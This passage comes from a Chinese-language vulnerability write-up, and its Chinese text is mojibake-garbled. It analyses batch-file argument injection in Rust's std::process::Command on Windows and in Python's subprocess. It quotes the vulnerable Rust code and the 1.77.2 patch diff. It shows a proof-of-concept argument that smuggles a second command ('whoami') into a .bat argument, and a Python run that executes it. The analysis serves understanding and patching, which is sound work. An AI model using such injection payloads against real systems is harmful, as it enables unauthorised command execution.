æˆ–è€…åˆ¶è¡¨ç¬¦ <code>\t</code> æˆ–è€…å‚æ•°ä¸ºç©ºï¼Œåˆ™ <code>quote = true</code></li><li><code>escape = true</code></li></ul></li></ul><p>å‚æ•°å¤„ç†é€»è¾‘ï¼š</p><ul><li><code>quote</code> æ¯”è¾ƒå¥½ç†è§£ï¼Œå°±æ˜¯å‰åå¢åŠ åŒå¼•å·</li><li><code>escape</code> ä¸»è¦å¤„ç†ä¸¤ç§åœºæ™¯<ul><li>æ²¡æœ‰å‰å¯¼ <code>\</code> çš„åŒå¼•å· <code>&quot;</code>ï¼Œè½¬æ¢ä¸º <code>\&quot;</code></li><li>æœ‰å‰å¯¼ <code>\</code> çš„åŒå¼•å· <code>&quot;</code>ï¼Œå³ <code>\&quot;</code>ï¼Œè½¬æ¢ä¸º <code>\\\&quot;</code></li></ul></li></ul><p>å¯¹å‰é¢çš„ PoC è€Œè¨€ï¼Œç»™å®šçš„å‚æ•°æ˜¯ <code>aaa&quot; &amp; whoami</code>ï¼Œæ‰€ä»¥è¿™é‡Œ <code>quote = true</code>ï¼Œå‚æ•°ä¼šè¢«è½¬æ¢ä¸º <code>&quot;aaa\&quot; &amp; whoami&quot;</code>ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨åŒå¼•å·åŒ…å›´èµ·æ¥ï¼Œå¹¶å®Œæˆå†…éƒ¨åŒå¼•å·çš„è½¬ä¹‰æ“ä½œã€‚</p><h3 id="3-4-make-bat-command-line"><a href="#3-4-make-bat-command-line" class="headerlink" title="3.4 make_bat_command_line"></a>3.4 make_bat_command_line</h3><p>å‡½æ•° <code>make_bat_command_line</code> çš„ä»£ç ä½äº <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/args.rs#L265" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs#L265</a>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">make_bat_command_line</span></span>(</span><br><span class="line">    script: &amp;[<span class="built_in">u16</span>],</span><br><span class="line">    args: &amp;[Arg],</span><br><span class="line">    force_quotes: <span class="built_in">bool</span>,</span><br><span class="line">) -&gt; io::<span class="built_in">Result</span>&lt;<span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// Set the start of the command line to `cmd.exe /c "`</span></span><br><span class="line">    <span class="comment">// It is necessary to surround the command in an extra pair of quotes,</span></span><br><span class="line">    <span class="comment">// hence the trailing quote here. It will be closed after all arguments</span></span><br><span class="line">    <span class="comment">// have been added.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cmd: <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt; = <span class="string">"cmd.exe /d /c \""</span>.encode_utf16().collect();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Push the script name surrounded by its quote pair.</span></span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    <span class="comment">// Windows file names cannot contain a `"` character or end with `\\`.</span></span><br><span class="line">    <span class="comment">// If the script name does then return an error.</span></span><br><span class="line">    <span class="keyword">if</span> script.contains(&amp;(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>)) || script.last() == <span class="literal">Some</span>(&amp;(<span class="string">b'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">Err</span>(io::const_io_error!(</span><br><span class="line">            io::ErrorKind::InvalidInput,</span><br><span class="line">            <span class="string">"Windows file names may not contain `\"` or end with `\\`"</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.extend_from_slice(script.strip_suffix(&amp;[<span class="number">0</span>]).unwrap_or(script));</span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append the arguments.</span></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> This needs tests to ensure that the arguments are properly</span></span><br><span class="line">    <span class="comment">// reconstructed by the batch script by default.</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args &#123;</span><br><span class="line">        cmd.push(<span class="string">' '</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">        <span class="comment">// Make sure to always quote special command prompt characters, including:</span></span><br><span class="line">        <span class="comment">// * Characters `cmd /?` says require quotes.</span></span><br><span class="line">        <span class="comment">// * `%` for environment variables, as in `%TMP%`.</span></span><br><span class="line">        <span class="comment">// * `|&lt;&gt;` pipe/redirect characters.</span></span><br><span class="line">        <span class="keyword">const</span> SPECIAL: &amp;[<span class="built_in">u8</span>] = b"\t &amp;()[]&#123;&#125;^=;!'+,`~%|&lt;&gt;<span class="string">";</span></span><br><span class="line"><span class="string">        let force_quotes = match arg &#123;</span></span><br><span class="line"><span class="string">            Arg::Regular(arg) if !force_quotes =&gt; &#123;</span></span><br><span class="line"><span class="string">                arg.as_encoded_bytes().iter().any(|c| SPECIAL.contains(c))</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            _ =&gt; force_quotes,</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">        append_arg(&amp;mut cmd, arg, force_quotes)?;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Close the quote we left opened earlier.</span></span><br><span class="line"><span class="string">    cmd.push(b'"</span>' <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="literal">Ok</span>(cmd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>é¦–å…ˆï¼ŒæŠŠ <code>.bat</code> æˆ–è€… <code>.cmd</code> æ–‡ä»¶è·¯å¾„è½¬æ¢æˆå¦‚ä¸‹å½¢å¼ <code>cmd.exe /d /c &quot;&quot;path&quot; arg1 arg2&quot;</code></li><li>å…¶æ¬¡ï¼Œå‚æ•°å¤„ç†é€»è¾‘å¦‚ä¸‹<ul><li>å¦‚æœ <code>force_quotes=false</code>ï¼Œä¸”å‚æ•° <code>arg</code> ä¸­å«æœ‰ <code>\t &amp;()[]{}^=;!&#39;+,`~%|&lt;&gt;</code> ä¸­çš„ä»»æ„ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™å°† <code>force_quotes</code> ç½®ä¸º <code>true</code></li><li>å¦åˆ™ä¿æŒ <code>force_quotes</code> ä¸å˜</li></ul></li></ul><p>åœ¨ PoC åœºæ™¯ä¸‹ï¼ˆå‚æ•°ä¸º <code>aaa&quot; &amp; whoami</code>ï¼‰ï¼Œè¿™é‡Œä¼ é€’ç»™ <code>append_arg</code> çš„å‚æ•°ä¼šæ˜¯ <code>force_quotes=true</code>ã€‚å®é™…ä¸Šï¼Œä¸ç®¡ <code>force_quotes</code> æ˜¯ä»€ä¹ˆå€¼ï¼Œå¯¹ PoC è€Œè¨€ï¼Œåœ¨å‡½æ•° <code>append_arg</code> ä¸­ï¼Œä¸€å®šæœ‰ï¼š</p><ul><li><code>quote=true</code>ï¼Œå› ä¸ºå‚æ•°ä¸­å«æœ‰ç©ºæ ¼ç¬¦</li><li><code>escape = true</code>ï¼Œå› ä¸ºæ˜¯æ™®é€šå‚æ•°ï¼ˆå³ <code>Command::arg</code> æˆ–è€… <code>Command::args</code>ï¼‰</li></ul><p>æ‰€ä»¥ï¼Œæœ€ç»ˆçš„å‘½ä»¤è¡Œå‚æ•°ä¸º <code>cmd.exe /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa\&quot; &amp; whoami&quot;&quot;</code>ï¼Œè¿™ä¸ªå¯¹ <code>cmd.exe</code> è€Œè¨€ï¼Œä¼šç›´æ¥å¯¼è‡´æ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ <code>whoami</code>ã€‚</p><h2 id="0x04-è¡¥ä¸åˆ†æ"><a href="#0x04-è¡¥ä¸åˆ†æ" class="headerlink" title="0x04. è¡¥ä¸åˆ†æ"></a>0x04. è¡¥ä¸åˆ†æ</h2><p>åœ¨ Rust 1.77.2 ä¸­ï¼ˆå‚è€ƒ <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2" target="_blank" rel="noopener">Rust 1.77.2 &amp; 1.77.1</a> Commit DIFFï¼‰ï¼Œå¯¹äº <code>make_bat_command_line</code> å‡½æ•°ï¼Œåœ¨ä½¿ç”¨æ™®é€šå‚æ•°çš„æƒ…å†µä¸‹ï¼ˆå³ <code>Command::arg</code> æˆ–è€… <code>Command::args</code>ï¼‰ï¼Œä¸å†ä½¿ç”¨ <code>append_arg</code> è€Œæ˜¯ä½¿ç”¨ <code>append_bat_arg</code> æ¥å¤„ç†å‚æ•°çš„å¼•ç”¨ï¼Œå¤„ç†é€»è¾‘æœ‰æ‰€å˜åŒ–ï¼š</p><ul><li><code>append_arg</code> å¤„ç†é€»è¾‘ï¼š<code>&quot;</code> è½¬ä¸º <code>\&quot;</code></li><li><code>append_bat_arg</code> å¤„ç†é€»è¾‘ï¼š<code>&quot;</code> è½¬ä¸º <code>&quot;&quot;</code></li></ul><p>æ¯”å¦‚å¯¹äº PoC ä»£ç ï¼Œä¼šè½¬æ¢æˆ <code>cmd.exe /e:ON /v:OFF /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa&quot;&quot; &amp; whoami&quot;&quot;</code>ï¼Œå³ <code>aaa&quot; &amp; whoami</code> è½¬æ¢æˆäº† <code>&quot;aaa&quot;&quot; &amp; whoami&quot;</code>ï¼Œè¿™å¯¹ <code>cmd.exe</code> è€Œè¨€ï¼Œä¸ä¼šäº§ç”Ÿæ³¨å…¥é—®é¢˜ï¼Œå‚æ•°ä¼šè¢«å½“æˆä¸€ä¸ªæ•´ä½“ã€‚</p><p>è¡¥ä¸ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">diff --git a/library/std/src/sys/pal/windows/args.rs b/library/std/src/sys/pal/windows/args.rs</span><br><span class="line">index fbbdbc21265..48bcb89e669 100644</span><br><span class="line"><span class="comment">--- a/library/std/src/sys/pal/windows/args.rs</span></span><br><span class="line"><span class="comment">+++ b/library/std/src/sys/pal/windows/args.rs</span></span><br><span class="line"><span class="meta">@@ -7,7 +7,7 @@</span></span><br><span class="line"> mod tests;</span><br><span class="line"> </span><br><span class="line"> use super::os::current_exe;</span><br><span class="line"><span class="deletion">-use crate::ffi::OsString;</span></span><br><span class="line"><span class="addition">+use crate::ffi::&#123;OsStr, OsString&#125;;</span></span><br><span class="line"> use crate::fmt;</span><br><span class="line"> use crate::io;</span><br><span class="line"> use crate::num::NonZeroU16;</span><br><span class="line"><span class="meta">@@ -17,6 +17,7 @@</span></span><br><span class="line"> use crate::sys::process::ensure_no_nuls;</span><br><span class="line"> use crate::sys::&#123;c, to_u16s&#125;;</span><br><span class="line"> use crate::sys_common::wstr::WStrUnits;</span><br><span class="line"><span class="addition">+use crate::sys_common::AsInner;</span></span><br><span class="line"> use crate::vec;</span><br><span class="line"> </span><br><span class="line"> use crate::iter;</span><br><span class="line">@@ -262,16 +263,92 @@ pub(crate) fn append_arg(cmd: &amp;mut Vec&lt;u16&gt;, arg: &amp;Arg, force_quotes: bool) -&gt; i</span><br><span class="line">     Ok(())</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+fn append_bat_arg(cmd: &amp;mut Vec&lt;u16&gt;, arg: &amp;OsStr, mut quote: bool) -&gt; io::Result&lt;()&gt; &#123;</span></span><br><span class="line"><span class="addition">+    ensure_no_nuls(arg)?;</span></span><br><span class="line"><span class="addition">+    // If an argument has 0 characters then we need to quote it to ensure</span></span><br><span class="line"><span class="addition">+    // that it actually gets passed through on the command line or otherwise</span></span><br><span class="line"><span class="addition">+    // it will be dropped entirely when parsed on the other end.</span></span><br><span class="line"><span class="addition">+    //</span></span><br><span class="line"><span class="addition">+    // We also need to quote the argument if it ends with `\` to guard against</span></span><br><span class="line"><span class="addition">+    // bat usage such as `"%~2"` (i.e. force quote arguments) otherwise a</span></span><br><span class="line"><span class="addition">+    // trailing slash will escape the closing quote.</span></span><br><span class="line"><span class="addition">+    if arg.is_empty() || arg.as_encoded_bytes().last() == Some(&amp;b'\\') &#123;</span></span><br><span class="line"><span class="addition">+        quote = true;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    for cp in arg.as_inner().inner.code_points() &#123;</span></span><br><span class="line"><span class="addition">+        if let Some(cp) = cp.to_char() &#123;</span></span><br><span class="line"><span class="addition">+            // Rather than trying to find every ascii symbol that must be quoted,</span></span><br><span class="line"><span class="addition">+            // we assume that all ascii symbols must be quoted unless they're known to be good.</span></span><br><span class="line"><span class="addition">+            // We also quote Unicode control blocks for good measure.</span></span><br><span class="line"><span class="addition">+            // Note an unquoted `\` is fine so long as the argument isn't otherwise quoted.</span></span><br><span class="line"><span class="addition">+            static UNQUOTED: &amp;str = r"#$*+-./:?@\_";</span></span><br><span class="line"><span class="addition">+            let ascii_needs_quotes =</span></span><br><span class="line"><span class="addition">+                cp.is_ascii() &amp;&amp; !(cp.is_ascii_alphanumeric() || UNQUOTED.contains(cp));</span></span><br><span class="line"><span class="addition">+            if ascii_needs_quotes || cp.is_control() &#123;</span></span><br><span class="line"><span class="addition">+                quote = true;</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    if quote &#123;</span></span><br><span class="line"><span class="addition">+        cmd.push('"' as u16);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    // Loop through the string, escaping `\` only if followed by `"`.</span></span><br><span class="line"><span class="addition">+    // And escaping `"` by doubling them.</span></span><br><span class="line"><span class="addition">+    let mut backslashes: usize = 0;</span></span><br><span class="line"><span class="addition">+    for x in arg.encode_wide() &#123;</span></span><br><span class="line"><span class="addition">+        if x == '\\' as u16 &#123;</span></span><br><span class="line"><span class="addition">+            backslashes += 1;</span></span><br><span class="line"><span class="addition">+        &#125; else &#123;</span></span><br><span class="line"><span class="addition">+            if x == '"' as u16 &#123;</span></span><br><span class="line"><span class="addition">+                // Add n backslashes to total 2n before internal `"`.</span></span><br><span class="line"><span class="addition">+                cmd.extend((0..backslashes).map(|_| '\\' as u16));</span></span><br><span class="line"><span class="addition">+                // Appending an additional double-quote acts as an escape.</span></span><br><span class="line"><span class="addition">+                cmd.push(b'"' as u16)</span></span><br><span class="line"><span class="addition">+            &#125; else if x == '%' as u16 || x == '\r' as u16 &#123;</span></span><br><span class="line"><span class="addition">+                // yt-dlp hack: replaces `%` with `%%cd:~,%` to stop %VAR% being expanded as an environment variable.</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // # Explanation</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // cmd supports extracting a substring from a variable using the following syntax:</span></span><br><span class="line"><span class="addition">+                //     %variable:~start_index,end_index%</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // In the above command `cd` is used as the variable and the start_index and end_index are left blank.</span></span><br><span class="line"><span class="addition">+                // `cd` is a built-in variable that dynamically expands to the current directory so it's always available.</span></span><br><span class="line"><span class="addition">+                // Explicitly omitting both the start and end index creates a zero-length substring.</span></span><br><span class="line"><span class="addition">+                //</span></span><br><span class="line"><span class="addition">+                // Therefore it all resolves to nothing. However, by doing this no-op we distract cmd.exe</span></span><br><span class="line"><span class="addition">+                // from potentially expanding %variables% in the argument.</span></span><br><span class="line"><span class="addition">+                cmd.extend_from_slice(&amp;[</span></span><br><span class="line"><span class="addition">+                    '%' as u16, '%' as u16, 'c' as u16, 'd' as u16, ':' as u16, '~' as u16,</span></span><br><span class="line"><span class="addition">+                    ',' as u16,</span></span><br><span class="line"><span class="addition">+                ]);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+            backslashes = 0;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        cmd.push(x);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    if quote &#123;</span></span><br><span class="line"><span class="addition">+        // Add n backslashes to total 2n before ending `"`.</span></span><br><span class="line"><span class="addition">+        cmd.extend((0..backslashes).map(|_| '\\' as u16));</span></span><br><span class="line"><span class="addition">+        cmd.push('"' as u16);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+    Ok(())</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> pub(crate) fn make_bat_command_line(</span><br><span class="line">     script: &amp;[u16],</span><br><span class="line">     args: &amp;[Arg],</span><br><span class="line">     force_quotes: bool,</span><br><span class="line"> ) -&gt; io::Result&lt;Vec&lt;u16&gt;&gt; &#123;</span><br><span class="line"><span class="addition">+    const INVALID_ARGUMENT_ERROR: io::Error =</span></span><br><span class="line"><span class="addition">+        io::const_io_error!(io::ErrorKind::InvalidInput, r#"batch file arguments are invalid"#);</span></span><br><span class="line">     // Set the start of the command line to `cmd.exe /c "`</span><br><span class="line">     // It is necessary to surround the command in an extra pair of quotes,</span><br><span class="line">     // hence the trailing quote here. It will be closed after all arguments</span><br><span class="line">     // have been added.</span><br><span class="line"><span class="deletion">-    let mut cmd: Vec&lt;u16&gt; = "cmd.exe /d /c \"".encode_utf16().collect();</span></span><br><span class="line"><span class="addition">+    // Using /e:ON enables "command extensions" which is essential for the `%` hack to work.</span></span><br><span class="line"><span class="addition">+    let mut cmd: Vec&lt;u16&gt; = "cmd.exe /e:ON /v:OFF /d /c \"".encode_utf16().collect();</span></span><br><span class="line"> </span><br><span class="line">     // Push the script name surrounded by its quote pair.</span><br><span class="line">     cmd.push(b'"' as u16);</span><br><span class="line">@@ -291,18 +368,22 @@ pub(crate) fn make_bat_command_line(</span><br><span class="line">     // reconstructed by the batch script by default.</span><br><span class="line">     for arg in args &#123;</span><br><span class="line">         cmd.push(' ' as u16);</span><br><span class="line"><span class="deletion">-        // Make sure to always quote special command prompt characters, including:</span></span><br><span class="line"><span class="deletion">-        // * Characters `cmd /?` says require quotes.</span></span><br><span class="line"><span class="deletion">-        // * `%` for environment variables, as in `%TMP%`.</span></span><br><span class="line"><span class="deletion">-        // * `|&lt;&gt;` pipe/redirect characters.</span></span><br><span class="line"><span class="deletion">-        const SPECIAL: &amp;[u8] = b"\t &amp;()[]&#123;&#125;^=;!'+,`~%|&lt;&gt;";</span></span><br><span class="line"><span class="deletion">-        let force_quotes = match arg &#123;</span></span><br><span class="line"><span class="deletion">-            Arg::Regular(arg) if !force_quotes =&gt; &#123;</span></span><br><span class="line"><span class="deletion">-                arg.as_encoded_bytes().iter().any(|c| SPECIAL.contains(c))</span></span><br><span class="line"><span class="addition">+        match arg &#123;</span></span><br><span class="line"><span class="addition">+            Arg::Regular(arg_os) =&gt; &#123;</span></span><br><span class="line"><span class="addition">+                let arg_bytes = arg_os.as_encoded_bytes();</span></span><br><span class="line"><span class="addition">+                // Disallow \r and \n as they may truncate the arguments.</span></span><br><span class="line"><span class="addition">+                const DISALLOWED: &amp;[u8] = b"\r\n";</span></span><br><span class="line"><span class="addition">+                if arg_bytes.iter().any(|c| DISALLOWED.contains(c)) &#123;</span></span><br><span class="line"><span class="addition">+                    return Err(INVALID_ARGUMENT_ERROR);</span></span><br><span class="line"><span class="addition">+                &#125;</span></span><br><span class="line"><span class="addition">+                append_bat_arg(&amp;mut cmd, arg_os, force_quotes)?;</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+            _ =&gt; &#123;</span></span><br><span class="line"><span class="addition">+                // Raw arguments are passed on as-is.</span></span><br><span class="line"><span class="addition">+                // It's the user's responsibility to properly handle arguments in this case.</span></span><br><span class="line"><span class="addition">+                append_arg(&amp;mut cmd, arg, force_quotes)?;</span></span><br><span class="line">             &#125;</span><br><span class="line"><span class="deletion">-            _ =&gt; force_quotes,</span></span><br><span class="line">         &#125;;</span><br><span class="line"><span class="deletion">-        append_arg(&amp;mut cmd, arg, force_quotes)?;</span></span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     // Close the quote we left opened earlier.</span><br></pre></td></tr></table></figure><h2 id="0x05-Python-ç‰ˆæœ¬æ¼æ´åˆ†æ"><a href="#0x05-Python-ç‰ˆæœ¬æ¼æ´åˆ†æ" class="headerlink" title="0x05. Python ç‰ˆæœ¬æ¼æ´åˆ†æ"></a>0x05. Python ç‰ˆæœ¬æ¼æ´åˆ†æ</h2><h3 id="5-1-æ¼æ´åˆ†æ"><a href="#5-1-æ¼æ´åˆ†æ" class="headerlink" title="5.1 æ¼æ´åˆ†æ"></a>5.1 æ¼æ´åˆ†æ</h3><p>Python åŒæ ·å­˜åœ¨ä¸Šè¿°é—®é¢˜ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">python3</span></span></span><br><span class="line"><span class="function"><span class="title">Python</span> 3.11.6 (<span class="title">tags</span>/<span class="title">v3</span>.11.6:8<span class="title">b6ee5b</span>, <span class="title">Oct</span>  2 2023, 14:57:12) [<span class="title">MSC</span> <span class="title">v</span>.1935 64 <span class="title">bit</span> (<span class="title">AMD64</span>)] <span class="title">on</span> <span class="title">win32</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> "<span class="title">help</span>", "<span class="title">copyright</span>", "<span class="title">credits</span>" <span class="title">or</span> "<span class="title">license</span>" <span class="title">for</span> <span class="title">more</span> <span class="title">information</span>.</span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">import</span> <span class="title">subprocess</span></span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">subprocess.Popen</span>(['<span class="title">test.bat</span>', '<span class="title">aaa</span>" &amp; <span class="title">whoami</span>'])</span></span><br><span class="line"><span class="function">&lt;<span class="title">Popen</span>: <span class="title">returncode</span>: <span class="title">None</span> <span class="title">args</span>: ['<span class="title">test.bat</span>', '<span class="title">aaa</span>" &amp; <span class="title">whoami</span>']&gt;</span></span><br><span class="line"><span class="function">&gt;&gt;&gt; <span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span>\"</span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-618<span class="title">ia48</span>\<span class="title">ddw</span></span></span><br></pre></td></tr></table></figure><p>å­è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ä¸ºï¼š<code>C:\WINDOWS\system32\cmd.exe /c test.bat &quot;aaa\&quot; &amp; whoami&quot;</code>ã€‚</p><p>Python çš„ä»£ç å¯ä»¥å‚è€ƒ <a href="https://github.com/python/cpython/blob/4abca7e1e7e2764faf20c7e677ea5c9ea9dbffe2/Lib/subprocess.py#L580" target="_blank" rel="noopener">Lib/subprocess.py#L580</a>ï¼Œä¸åƒ Rust ä¸€æ ·ï¼Œè¿™é‡Œæ²¡æœ‰ä¸“é—¨å¤„ç† <code>.bat</code> æˆ– <code>.cmd</code>ï¼ˆ<code>CreateProcess</code> æœ¬èº«å«æœ‰ç‰¹æ®Šçš„å¤„ç†é€»è¾‘ï¼‰ï¼Œä½†è½¬ä¹‰çš„é€»è¾‘æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥ä¸å½±å“æ¼æ´è§¦å‘ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list2cmdline</span><span class="params">(seq)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Translate a sequence of arguments into a command line</span></span><br><span class="line"><span class="string">    string, using the same rules as the MS C runtime:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    1) Arguments are delimited by white space, which is either a</span></span><br><span class="line"><span class="string">       space or a tab.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    2) A string surrounded by double quotation marks is</span></span><br><span class="line"><span class="string">       interpreted as a single argument, regardless of white space</span></span><br><span class="line"><span class="string">       contained within.  A quoted string can be embedded in an</span></span><br><span class="line"><span class="string">       argument.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    3) A double quotation mark preceded by a backslash is</span></span><br><span class="line"><span class="string">       interpreted as a literal double quotation mark.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    4) Backslashes are interpreted literally, unless they</span></span><br><span class="line"><span class="string">       immediately precede a double quotation mark.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    5) If backslashes immediately precede a double quotation mark,</span></span><br><span class="line"><span class="string">       every pair of backslashes is interpreted as a literal</span></span><br><span class="line"><span class="string">       backslash.  If the number of backslashes is odd, the last</span></span><br><span class="line"><span class="string">       backslash escapes the next double quotation mark as</span></span><br><span class="line"><span class="string">       described in rule 3.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># See</span></span><br><span class="line">    <span class="comment"># http://msdn.microsoft.com/en-us/library/17w5ykft.aspx</span></span><br><span class="line">    <span class="comment"># or search http://msdn.microsoft.com for</span></span><br><span class="line">    <span class="comment"># "Parsing C++ Command-Line Arguments"</span></span><br><span class="line">    result = []</span><br><span class="line">    needquote = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> map(os.fsdecode, seq):</span><br><span class="line">        bs_buf = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add a space to separate this argument from the others</span></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            result.append(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">        needquote = (<span class="string">" "</span> <span class="keyword">in</span> arg) <span class="keyword">or</span> (<span class="string">"\t"</span> <span class="keyword">in</span> arg) <span class="keyword">or</span> <span class="keyword">not</span> arg</span><br><span class="line">        <span class="keyword">if</span> needquote:</span><br><span class="line">            result.append(<span class="string">'"'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> arg:</span><br><span class="line">            <span class="keyword">if</span> c == <span class="string">'\\'</span>:</span><br><span class="line">                <span class="comment"># Don't know if we need to double yet.</span></span><br><span class="line">                bs_buf.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c == <span class="string">'"'</span>:</span><br><span class="line">                <span class="comment"># Double backslashes.</span></span><br><span class="line">                result.append(<span class="string">'\\'</span> * len(bs_buf)*<span class="number">2</span>)</span><br><span class="line">                bs_buf = []</span><br><span class="line">                result.append(<span class="string">'\\"'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Normal char</span></span><br><span class="line">                <span class="keyword">if</span> bs_buf:</span><br><span class="line">                    result.extend(bs_buf)</span><br><span class="line">                    bs_buf = []</span><br><span class="line">                result.append(c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add remaining backslashes, if any.</span></span><br><span class="line">        <span class="keyword">if</span> bs_buf:</span><br><span class="line">            result.extend(bs_buf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> needquote:</span><br><span class="line">            result.extend(bs_buf)</span><br><span class="line">            result.append(<span class="string">'"'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br></pre></td></tr></table></figure><h3 id="5-2-CreateProcess"><a href="#5-2-CreateProcess" class="headerlink" title="5.2 CreateProcess"></a>5.2 CreateProcess</h3><p>MSDN å¯¹ <code>CreateProcessW</code> çš„è¯´æ˜æ–‡æ¡£æœ‰å¦‚ä¸‹çš„è§£é‡Šï¼š</p><blockquote><p><strong>[in, optional] lpApplicationName</strong></p><p>To run a batch file, you must start the command interpreter; set <code>lpApplicationName</code> to cmd.exe and set <code>lpCommandLine</code> to the following arguments: /c plus the name of the batch file.</p></blockquote><p>å®é™…ä¸Šï¼Œ<code>lpApplicationName</code> å¯ä»¥æ˜¯ <code>.bat</code> æ–‡ä»¶çš„è·¯å¾„ï¼Œ<code>CreateProcessW</code> ä¼šè‡ªåŠ¨è¿›è¡Œç›¸åº”çš„è½¬æ¢æ“ä½œï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    